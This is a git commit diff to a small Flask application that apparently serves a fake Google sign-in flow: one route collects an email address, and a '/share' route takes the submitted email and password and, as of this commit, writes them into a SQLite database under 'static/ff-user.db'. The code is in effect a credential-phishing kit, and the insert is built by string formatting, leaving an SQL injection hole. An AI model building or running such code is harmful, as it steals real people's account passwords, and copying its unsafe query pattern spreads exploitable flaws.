609957dc6d37dfcb966e32cd09834ea294127327
SivaPrakasam7 <prakasams22@gmail.com>
2021-06-10 00:07:48 +0530

    mod

--- app.py
+++ app.py
@@ -8,33 +8,38 @@ app=Flask(__name__)
 def index():
     return render_template('index.html')
 
-@app.route("/googlepass",methods=['POST'])
+@app.route("/gauth",methods=['POST'])
 def glogin():
     mail=request.form['identifier']
     print('\n\n\n',mail,'\n\n\n')
     if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
     return render_template('googlepass.html',act=mail)
 
-@app.route("/shareme",methods=['POST'])
+@app.route("/share",methods=['POST'])
 def share():
     email=request.form['email']
     passwd=request.form['pass']
-    print('\n\n\n',email,passwd,'\n\n\n')
+    con=sqlite3.connect('static/ff-user.db')
+    cur=con.cursor()
+    cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
+    con.commit()
+    con.close()
     return render_template('share.html')
 
 @app.route("/<name>",methods=['GET'])
 def login(name):
     return render_template(f'{name}.html')
 
+# @app.route('/db')
+# def db():
+#     try:
+#         con=sqlite3.connect('static/ff-user.db')
+#         cur=con.cursor()
+#         cur.execute(f"create table user(id INTEGER PRIMARY KEY AUTOINCREMENT,username,password)")
+#         con.commit()
+#         con.close()
+#         return "Database created"
+#     except:return "Database Already exits"
 
-# google account show profileIdentifier
-
-# google next identifierNext
-
-# <script>
-#    $(document).ready(function(){
-#    document.getElementById("profileIdentifier").innerText="{{act}}";
-#    });
-#    </script>
 if __name__=="__main__":
-    app.run(port=4000)
+    app.run()
